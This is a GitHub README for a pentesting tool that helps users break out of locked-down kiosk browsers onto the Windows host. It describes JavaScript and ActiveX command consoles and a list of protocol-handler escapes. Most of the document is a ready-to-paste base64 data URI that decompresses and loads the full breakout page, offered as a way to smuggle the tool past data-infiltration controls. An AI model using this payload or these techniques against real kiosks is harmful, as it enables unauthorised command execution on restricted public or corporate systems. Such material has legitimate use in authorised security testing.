# KioskBreakout
This HTML page contains functionality to assist pentesters in escaping restricted browser environments and access the underlying windows OS. The page is entirely self-contained and includes no external dependencies making it suitable for usage against targets with limited or no outbound internet access.

![](https://github.com/PN-Tester/KioskBreakout/blob/main/Breakout.PNG)

# Rational 
There are several websites that offer similar functionality such as the classic [ikatz breakout tool](https://www.ikat.kronicd.net/Windows/) and [phrack.me kiosk evasion tool](https://www.phrack.me/tools/2022/11/02/Kiosk-Breakout.html). While these are excellent resources, sometimes you will not be able to perform arbitrary navigation to third-party sites from your kiosk target. In situations where **internet access is restricted** or severely filtered, it may be necessary for testers to have a self-contained, offline version of these tools with similar functionality. This kiosk breakout assistant fills that requirement. I have combined the protocol handlers from both of these tools, and included _some_ of the functionality from ikatz. In an effort to keep the html file as small and portable as possible, many features have been omitted or shortened.

# Usage
Simply load this html file in the kiosk browser somehow, and you can begin attempting to breakout using the functionality built-in to the page. There are currently 5 main sections.

1. **JavaScript Console** : Lets you run arbitrary javascript from the page itself, useful when developper tools / inspect element are disabled.
2. **ActiveX Console** : Lets you run arbitrary os level commands from the page. This will not work in modern browsers, but is useful if you can somehow get the page to load in IE. 
3. **Common Dialogues** : A few common web features that may let you open an explorer context even when keyboard shortcuts are disabled (upload file, save as, print, etc.).
4. **Chromium Settings** : These are pseudo-protocol urls that open various settings in chromium-based browsers (Edge, Chrome, Opera, Brave, etc.). Browser security forces us to copy paste these into the URL bar.
5. **Protocol Handlers** : This is a list of 437 protocol handler links that may trigger an explorer dialogue or otherwise launch another application that presents breakout possibilities.

# Transport
If you are wondering how to get this page into your target environment, consider using a data-uri! Encoding the entire page a data:text/html uri is an effective way to circumvent data infiltration countermeasures. 
The KioskBreakout html page itself is 26552 bytes in size. With base64 encoding, this may be **too large** to easily paste into your target URL bar without truncation or corruption of the data. Similarly, using an alternate mime-type like application/gzip is probably restricted in your target environment. If this is the case, and you have clipboard access, try using the below data-uri, which uses the commonly allowed text/html mime-type, with inline gzip decompression logic, to upload the page! Using this technique, the full file is only 9194 bytes, which is confirmed to work in all modern browser URL bars!

```
data:text/html;base64,DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9J2VuJz4NCjxoZWFkPg0KICAgIDxzY3JpcHQ+DQogICAgICAgIGNvbnN0IGRlY29tcHJlc3MgPSBiYXNlNjRzdHJpbmcgPT4gew0KICAgICAgICAgICAgY29uc3QgYnl0ZXMgPSBVaW50OEFycmF5LmZyb20oYXRvYihiYXNlNjRzdHJpbmcpLCBjID0+IGMuY2hhckNvZGVBdCgwKSk7DQogICAgICAgICAgICBjb25zdCBjcyA9IG5ldyBEZWNvbXByZXNzaW9uU3RyZWFtKCdnemlwJyk7DQogICAgICAgICAgICBjb25zdCB3cml0ZXIgPSBjcy53cml0YWJsZS5nZXRXcml0ZXIoKTsNCiAgICAgICAgICAgIHdyaXRlci53cml0ZShieXRlcyk7DQogICAgICAgICAgICB3cml0ZXIuY2xvc2UoKTsNCiAgICAgICAgICAgIHJldHVybiBuZXcgUmVzcG9uc2UoY3MucmVhZGFibGUpLmFycmF5QnVmZmVyKCkudGhlbihmdW5jdGlvbiAoYXJyYXlCdWZmZXIpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFRleHREZWNvZGVyKCkuZGVjb2RlKGFycmF5QnVmZmVyKTsNCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9Ow0KDQogICAgICAgIHdpbmRvdy5vbmxvYWQgPSBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgIGNvbnN0IGJhc2U2NERhdGEgPSBgSDRzSUFBQUFBQUFFQUoxZFhYTWJONVo5MzZyOUQxeHRWZXlVbDVMdEpMTzFpZVF0amFPWmVPTllMc3VabllkNUFidEJFbVkzQUFOb1V2UlUvdnRjZERjcENoY0haS0lYUytlZWN4dU56NHV2OXVVeXRNMnJmLyszeTZVVU5mMDdHWDh1ZmVXVURRZkl2Tk5WVUVaUFhLZGZtN1lWdW43NjllU2ZENFQ0RTl3MmhlTFBXcmlKWDhxbW1WeE50TnhNcnNuVFd2NzlkdlpKVnVIcDJmL2Y5UTg3djR1VXM2OS95RHVvaG9lU2k5cFVYU3QxT0YvSWNOUEkrT3VmdDIvcXAyY2o1ZXpyODdWb09na2N5WHRaa1pjK1FlYzM5TWZUVVllZWJMcGd1MENTc3pOaWNNNW1xUm81ZWZvZjBmSDVYYWh2dTNCK0hXNTBmVHUvQzA2S2x1WFQ3bWYwL094cWNxajlRR1h4Vm1sSitmdHNjdllQZlpaSjEyKzVoTUNNR1o2enl4ZDZrd0ZJL1A0MnFVU29scE9uTXB0ZzBVaEhwZlhPaE1tTkZyTkcxcXlzZm52NGMvejE4dUpSVGJyMFlkdklnMm8xTXpXck1qTlJyUmJPZExxZVZxWXg3dnZKZno3dmY3NTcvc1BrTVhWdWRKak9SYXVhN2ZlVEp6L0paaTJEcXNTVC81cDRvZjNVUzZmbWg1cURCQzVmSGo1M2ZOREN5ZTBQZWZxTFU5bjB5dU5MWGw2TXplcHkrZUxWejI5dTczNmUvUG5EemZYUHQ3OStuRnpmM2IyNSszajk3aU9SWHZTVWw2Lys3L3B2MTNldlA3eDUvM0h5K3ZiZDNlM2JHeksrak1ZZzc0T2dxalJSOWRXWk9Zc0o4RmRuM3o0L216aXpvZDlleE4vb1dVWTMyMWVYRnp2NnE4dVpZM0xGNWQrZFpVU3pMZ1JxNzBaWGphcFdWMmZVdVA5cGhocjA3RXJTdjAvVjhOZlh6NTc4UXovNXJhODhWSGNPU0lOaHBGMDllWEwyNmtPbkx5OEd6K05MWDcvKytPWnZOMzh2di9GUWYwdXZxSFJzU1pHODZ3VW1ZV3NsSlp1SVoraWREanV6WE9KZTMvN3l5KzI3eVk5dnJ0L2UvdlhYbTd0ZDZycG1WNkViOWFqYnRFSy91aFN2L2hKN2hGc3I5ZVJISlJxenVMeWdoRjcwMWdQMmtPWWhtWE5Tbk8yY1h1eTk1djFQbGs3T3I4NCtpYlVZbXRmM0c2VnJzem0zVHVrUVgrVjkvSVU5OVE4NHJzMmRXTXRySDUzRzN5YlgvZys3N1ZObm5Wd3J1VG1QSXcrVmtYRFVXVkZCcU1VeWpNbWV2QjhvNkRtWEYxMnpLNStmUHR6Kzh1YlhYeVozTng4L3ZubjMxOGNGRkJOVExaMXA1ZmNYRjE2R29QVENYK3k4SEJybmpRQVdxajFTZXhyNDhtYktkTjBZVWVldFMrV0RjZHVzYldiTXFoVnVsVmNLYTRGaFJvMGhhMWxMRjlPWnRXa1pwcFN6MG1uUjVQMHViSmZGcmFHV2tuK0R6NTBKNG9qYldtbVROVkQvWE0vTVBSRDVTamlRcHhzNWM2RTY4bGlsdmFYWUltc0xUbFJVRWJLMnlnbUtDL0krcVYreFJ0T1ltamY3clEreXpadlVRaXQ5Sk1tZG54MWh0TEpXeC9MYkN1ODN4dFZUNnRQRVFyb2o5Qm4xeThHWXNEekNvL3BEWGxkVDZaeHhLTXVwbDFlMUNJL2F5a05UZmYvaDl1UHQ2OXUzazUrdTMvMzQ5dVlEYjZyN2ZrSUlRUTRiVTRsbWFUeDFDeE5DaHQ1Zy85eERzdWRzRCtteC9hVDhpRUZCSld6S0p3alRLK2FlSUV5dkdidkdaTWZJcmtBMk04SFQwcU5ZNUR2RkpJUkJRYTI2OXA2YVZDcmE0VmpJa2xialpNMVpFY3h4Q2N4WmZaamo2cURhbEt4YVNHNDljMDBRcE92YUdjWEtkMENoeURTaUMyYXU3bFBkM2dDbDFsTHpZeVV4b0ZqRXlzSGljbUQxRDFjL3QyTGNGU1NISUtwbG5LK2ttcjBCU2plcFpJT29NK0dvYjByb0F3Z2wwaThweWt3MUF3cEZLbFJHc1FjTjZCRlJSZU5QWGhndEJUSEZHWTduMzRNQlNoc3pTMFVFUVRyTmZGSTZRWkFlNXhmU1VSQ1ZpdllHSkszRVREU0pxc2V3b0ttNlJ0RDdNdFhPVUpBMklYMnZBY1NTZHU3TWdtbDZGSXZTZnF3d2tsQ0JwN2tXb1JJOTdaMTZEQXI2a1h1NkQzQlRiV0l1dThtS29ZUjFpaFh1RUNzajdMTlFzWXdiNGFKc3d6SmtRRXVpaktKRTl5QnQvbGppZkQ1MS9ranlzaG9zYUtkeVRhMS81bFNRVStwTnBhNGxLNnc4Q3p1bFVGR0hhWnkzTWs4UHBpUHl2QktLSEs4eXJsQm4xaXliMWpDVGFzRUtQVUtZbnZhWGhHQnkrcUkxRHI0eWczZHA1SzdGbXJIWGtLeUV0NGFGYVRzWXkxZzBHeUZNVDB1cHhvVkVzenhHeG9YVWFERzFqZGpHaWlLVWxta256d2xIWFhtYUJUWnBGVTZzMElsbWlkYzQ4VHF3R2tZUXBKczBCQ2NFa2kxemJiRm5sMGE3aEdDeVlhNEpndlRRc21RVGhPbnBnRU1JSks5Wm0xdmpOcmRPUTJkQ0lIa2ptV3VDRUYzV0w5T3dOa0tRM3ZnMFR5SUU2ZTFNMXJWTTI5QU9oakpXRnlXdWl6SXNLZXpxMG5xd2c2SHNYclNXTlpZUlJhSzVxR1JRTERqWXdWaVdGaUFoa0Z5TGZsOHFWWXd3bEVtV3pSRXEwZVBpOHphajZmR1NNQzJkSG9NQ1ZhZUJhSVF3blJWS2hFcjBZYUVxSXhvTVdLb1hyTmNkUUN5aGY4ejllZWZTUVA3QWNrUU10V1dwRDFQWDZhbVZtaUpZSzUyU3V1SVpsYWRodDJ4dUZpRklaM21NODVhTkQzTThQTXk3YXVrVkRWS3JkUFp4WUVIaWhVeHJGeUdRbkQ1Z2dmMnFORTRnQkpPL3RNWTZFN2QvbWVyQkJPVmFNaGxCbU40RjJUUnA2TE9Eb1l4bEZNNG5ZNWVzYVF3Z2xEaGgwOHJVWTFoZ3pEcXR3UU9JSld0RE5adHBlaFNLdkhDVnFObVRSaGpLZ21qU2tiSEhrR0Q1emN0dkVuNkVJRjJrcllrUVNPYno3R1Zob3Ixa0U3Z2xucm90QTJ1ckVTclIwLzYveDA0V1hCeFYzTit6RkJGVW9yTVVSUXdLdHJVVFg0eE9xOFFleDBMTFdrV1BJWUZpQTcvQ0E3L2loYXdLaGF3cUZpTkVDTk0vZDU2bGZrU3hLSTBQQ0lGa2VjNjcvUUVzU0RMVmIwU1BpTklpMzhGWTV2ckZiaUZFejNaNG5ac3RvZU1WZE5YeVFtc0xoZFpTVUtJcnB1aFJLTkx6dE91T0VLU2JFUGNibVdTRW9jeXliWVlJWVRxcmZSWlhQc3NpK2doaE9zdFRQQVVrRS9kZHFBYXUrbE5LSjZoQVAyUlBwdThuWDhWdDRoK0M5R0g0YmZCd29vT2paUFl1QkdHNjh1Y3pLVmx1N2ZDaXNObDh5ZWtJTHNydUxYK2hBVDRtNDY4MjRpVmhSZ1BwM3NUVENXbTN2b09oTExUc0tRU1Y2RGwrUWNCekxPRGMraVJtTTlaUER5Q1djRDRtczdmOWhGLzJrekZzemI3SGtHQWx0MWF3S2oraVNOUUlIOWprWWdDaFpPYlNvU2xDa0Y2emJqcENKWHFhU3owR0JWTFlZT0pPaVdBOTNTTWJkR0NjMklpMFN4MVJLRm8zYWVGRUNOSGJiMXRSMVU2eHFQdkJBS1VpTTBjWlFDeFJEWVVXYTFhWEh3d2xLZHU5R2tBc3NlbkNWSVFLOUxTWTJrTHh4bU5ObWRlUElKWUV4N2E4QnhCSzRuR1lUOTFLemd3VEhwaXczSHV4WUdVN29GQ2tLbWU4bVlmejRjQ2RQNjlFSzUwNGI3c21LS3VxRlMrL0V5Uy8rM0cvNzBsLzdDRW5lc2R1MHdXMkZ1OEZ0SHpjYndzRGY4czY1UlozeW1SaWRiSEZYVExaT2s3dklOM1ViREd0eDdCQUwweWRManFQS0JZNXU1UWRlK3NSeHJJMFppR2tRRlo4bVdSRW9jaStURWVLQ0dHNnFUUDcyanNZeXZ4VVZKVmtnY1FlTHdqSGt3WnduenRIS2JpcjBDbURSN2FDZzM3Z21QTCsrc0ZTRUV2dFROTmtEc284c3BVYzNGY3lYVkRkd1NYWlZzWjlOWHFBdDFKVzZjcFZobEZ3dHFCK1l5WmNITlFVRlI3M2xSREtyaFExSEJvY0c1RUdPS201NUVaU3hERlhiSVg0MEZTUUwyWERHc0dBRmtSeFRtcEZ5R1RsemxJVTJ5NElOdTg3c0JURXBGajV5a21wOTBkYXAxUjJjNVV1OXhhNWhRY01CMVY5Zi9kbHlvY0JSaWk2a2tHYjlJelhnNkVrVmZmOTVreWp3cmFpbUxKalU1MDhxZVRTekZRamJjT2oxc2ZHZ291aE1tV0xibThxeUswMGZCdHVqNWVFWmlPZE5TclhjenpZU2c2eTYvVVBocEswbXpYSzh5WHlRMU5CN21RL0lRMWlGdXVnME5rK1BFTXF1QnlyZEtNeXhmQmdPK3JBVTBTYjZ3d1ByU1Vua21aNVMwcTZGU3FUTjQvTVI5MGdmVkZJVGJrV2Jqc21lRHIyNEUydXBBcmszL01JTDBPWHkvUXNyK2g0dU00eHBieUpiVTdHb0N2bk4wTTd4ZTMrWkh6QjU1NXppc044VU0wSUo3bVNUVU54UnJhUUVzcEo3aHJUMWJIMVpLWkRnSGFTVzZNMTlRdjlUVUVKUnZvQytaUkgxTXIzUjNVb2FMS21NWXRNQ0lDNXB6eEF4bW0wb0lwWlZhYlQ3SHhsaVhxS2UrSXZ1bkt1N3lnbnVTTWZtYk1RT2NxSjd0SXR2ZFI4aWhzOXI0S2pRWEU0a0ZIS3dvUjVrbk1URkkyYTRxanJROTRwanZzeHNlQ3d0NS9raUtKNndUYUdNb3pUbkpsNzFWS3NVblEzY2s1eE9QUzJ6b1JqRmVjeDhSVFhHOHJ3Z3NOb1BzbU5jU3RxdUxuWW5ITk9jSWpkbE1RMkU4VVNXSktFQU9jbEQ3YUNnNzRwcUpDZEtqN1lDZzdpVm1Wc1NtdXFDNTZ2eHpGQ3dkVmF1ZENKSnBpdVdscVJ5WXVFVUhSRk0reWNBNElMc28xb1Z0bXNHQTBsNlZJRk9UUEMxZE9xemFUOXNmMGtSeVVuSlFjbUt6VkYwZjA0dmJ6NFg2VjlFRTF6OWVJcmF1TjFWNFVyOGRWNDY1T3czcXU4b3RpcDgxL05xSUxVVktuZmkycEZvOGZWOEtUNzhweDB4aE0zSzZTc1Znc1YwMk55YTVHUHJkaUpacnZIUFlZRmprZVBydkJPanE5Y1J3d0xPQjJUV1p2Q2JTaDhadWttQ05LN2RzYW5lVDJJSmZHZUY5ZjBLQlN0V1orL3hwMzdscGZWRmhlVkZtdTFpSXRoL0FqZm9RbktKYnNmRVNGSVo5dnhHdS9HNjNSZzBuQW8waXFkQVJBQ3lmeWd0eTRjOUthZ2hBWEZQUVlGN055dXhrZDJUVFZQeUlSQU1sdW1LZHhSTkd6NTNlRGw5N2htUk8rVTZYb1BMRWZFZVNFVVdmRzVrN0hqQ1diRnpyOGxWdXhFYXJ1dzM4NXQyclVkV0tBNFdOR3hxZU9JUWxFWEdtTlc1LzJIYVZMcG9lMllBMnBVNTVuenphbjVGRGZaclVWT09NV1ZEejV6bGlmRE9NWFpSczRxZGp1UUU0NjR3cGwwUXY3a1RuWWZtcENjYjVnVTlrdXNZRk93Q0dGNmszWVFFY0owelE2Yjl4Z1dXT0hFbHk5cDk3bkhzWENiMmJRWTBZS0kxYjBlZzRMTTFwSXQ3U3RabWhINmRFMW1BS0ZrVmZrWEwxSkpEMEpKSThMY3NLczNPN2dndTJldkh6RW8wT3dSR252UGJzUWQyWWV6N0VhUXhSZUNyRzE1UERLQVVPTFllQmdoVERmZVNzY3lhWVFMc3Z0MFV0WmpVT0MzYWI4VklVam5aelJ0NFlDbTNiQ3hOMEtJL2puZE92NE1kNDFwbkdQSGZub01DMVExekMydGNXbmRlR3dzdVZobEx2M3NjU1Iwa2w4STdMR2lJS3NvU09LM2VwZ2tnbGpDSDFIdzcwM24yRkxGRG9heUpUdHVGU0ZJYjh5Q2ZWNWdBS0dFM2MxeitHcWV5NHpUcmpReXU5Q3lEM1QwV0VHUTRSZm9udE45a2M0S0xXSWxRWHJtbzhlUXdBdW4wdUM2eDZBZ3pVOFBNL091V2tyV2VnWVFlMCt6eCtNTERPT3VFZ3ZoOXpnV3hpMmFSczNUeEQwWUNsSW40Mm9WRDhjUFRWamVId1JneWg3RklwODU3VEdpVU1TUDVQdkNnWHkvWVA0WDJIZjhab2o0a29ZYk94akxXTjFad3NyamwvenJSajJHQlh5dzhxWHJCRjVKZGlDeXg3Qmc4WkpmZ3g5UkxJcjNTaHRaOHl1SGg2YXlQRDBWT0tKWXhESUNid0dUaVRVZ2hYc1l2K0lmUytneEtHalRZWjRRVEdZcHg1MnA1eTIvME9aYlhqdmFRdVhJTE5yNDBxcU4xenpwdXBCMkkyenVCUDhlUHlwa3Fkc2JzTFRKVk44ZXhCS2VRSncwcSthOFMrMUJMSW03V1dsa042SlE1Rm1OOHJoR3NadXVIbDkwOVVHeTIzazloZ1VVQzI1enExOEhGaXpPclNNY1dUdndvV005ZGVod1YwMDJuclFPN3h6NmJ0YXlHN0FEQ0NWci9TeVR6UU5hRUhFQkpHK1k5dzMyekdjaHZqQUxpYmJNNmJVZERHVmJMVExUemgyTVpFR2tSOU1JZ1dTcWVUVC9FK25DeVI3SHduUkZLZUJEa1dSU1FySTgyOEVGR2I4Wk1JQlF3bU9TVUloSndqS3p5em1BQlluUEg0Yy9zRUF4R3pZREhqYUQvdWJsZno5UCtUMElKY2F3WWlFSTAzUGZRVHZ5RWJRUWQ3ZXJiMVBSZ0dJUmE0eWgwQnBENXhpZG9CS2RsV0xFb0NEOUdsQ0FId01LYThIUHNnd2dscVFUSkVJUXVhdlRLa0VJSk90NC9ETGw5eUNXK1BSbEk0VG92MzU0azdBSmdiNVpLUlVLcVFzdm56OVBxODBBUWttbjZxblNVenRzektiYXgxYm9aTTJ1dkVRSTBkZkQ1NzBTeFloQ2tXelpva0dQWVlFT1RySFBBKzVnTEV0cjRob1AvbXRWU3dvTzBwZmZ3VmdtTjlQczBzeUJCWXBac0xIR2dRYjc4QmorN3RqYVY2YVdWTnFlVXUrNDdwRzE3Q1NyeFpLR1A2eUJUOWdJdGl3WElVaG4zNmpkNEcvVVpyZHh5bHMzZzVXbGFFQ2hpQjlGS2gwL0dpODR4YjB0dkF1V0o1M3FNak5SeWxGT2RzYzNubk9VVTkzbDVuRlpEblRJN3ZCdThCWGVqV1ZoVklRZ25hVU1KNE90RDIvdzR2QW1DRlpKQ0lMMGJhVTIyelF1SFZFa3VxK003bzlkc1RjK3NKVEVHUldreHc4bHBmeUlRVUhiT0Z2bDV0Y0hsaFBFYVo0Zm1yQ2MzWWlJRUtTN3RLZ0lRZVJ0NnhkcHA5UmpTUERsbS84NS95Nk5VZ2V3TEVtZk1xSmxVWnBkSTNvZ0d2N3ZnK0U3NlJmOS85anpMeEhMMCtPNFp3QUFgOw0KICAgICAgICAgICAgZGVjb21wcmVzcyhiYXNlNjREYXRhKS50aGVuKGRlY29tcHJlc3NlZFRleHQgPT4gew0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvdXRwdXQnKS5pbm5lckhUTUwgPSBkZWNvbXByZXNzZWRUZXh0Ow0KICAgICAgICAgICAgfSk7DQogICAgICAgIH07DQogICAgPC9zY3JpcHQ+DQo8L2hlYWQ+DQo8Ym9keT4NCiAgICA8aDE+U0xPUFBZQ09QWSBEQVRBPC9oMT4NCiAgICA8ZGl2IGlkPSdvdXRwdXQnPkRlY29tcHJlc3NpbmcuLi48L2Rpdj4NCjwvYm9keT4NCjwvaHRtbD4=
```


If you **do not have access to the clipboard**, no worries. I have another project called [sloppyCopy](https://github.com/PN-Tester/sloppyCopy) which can get this file into a restricted environment in less than 3 minutes via keyboard simulation. Simply point SloppyCopy at KioskBreakout.html with the ```--citrix``` and ```--uri``` flags, click the URL bar in your restricted browser, and wait for the keyboard simulation to complete. SloppyCopy will generate the compressed html data and embed it in a template which can automatically decompress without third-party dependencies. The template is then converted to a base64 encoded data-uri (this technique was used to generate the uri above). 

# Demo usage with sloppyCopy

![](https://github.com/PN-Tester/KioskBreakout/blob/main/breakout%20demo.gif)
